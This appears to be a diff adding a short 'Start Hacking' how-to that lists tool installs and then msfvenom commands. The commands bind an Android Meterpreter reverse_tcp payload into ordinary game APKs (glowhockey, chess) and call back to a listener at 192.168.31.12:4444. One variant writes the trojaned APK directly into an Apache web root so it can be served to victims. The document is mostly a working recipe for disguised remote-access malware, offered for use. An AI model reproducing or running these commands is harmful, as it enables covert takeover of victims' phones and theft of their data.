@@ -1,0 +1,19 @@
+in linux you will be needing apktool, jarsigner, zipalign
+
+requirements:
+
+$ sudo apt install apktool
+$ sudo apt install zipalign
+$ sudo apt install openjdk-11-jdk
+
+Start Hacking:
+
+$ sudo msfvenom --arch dalvik --platform Android -x glowhockey.apk -p android/meterpreter/reverse_tcp lhost=192.168.31.12 lport=4444 -o newfilename.apk
+ex: sudo msfvenom --arch dalvik --platform Android -x ches.apk -p android/meterpreter/reverse_tcp lhost=192.168.31.12 lport=4444 -o chess1.apk 
+
+or directly paste it in the apache server folder
+
+$ sudo msfvenom --arch dalvik --platform Android -x glowhockey.apk -p android/meterpreter/reverse_tcp lhost=192.168.31.12 lport=4444 R> /var/www/html/filename.apk
+
+
+/usr/local/bin is where the apktool should be stored/ will be stored
